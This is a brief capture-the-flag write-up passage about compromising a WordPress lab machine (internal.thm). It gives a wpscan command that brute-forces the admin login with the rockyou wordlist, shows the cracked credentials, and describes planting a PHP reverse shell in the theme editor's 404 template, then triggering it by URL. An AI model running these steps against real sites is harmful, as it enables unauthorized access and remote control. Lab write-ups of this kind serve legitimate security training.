we enumerated the user `admin` with wpscan. we can brute force for the password with this command:

`wpscan --url http://internal.thm/blog/wp-login.php -U admin --passwords /usr/share/wordlists/rockyou.txt`

we get the creds:

```bash
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```


I decide to upload a php reverse shell.
This can be done by going to `Appearance > Theme Editor > 404 template`

We can activate the reverse shell by going to this address:

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php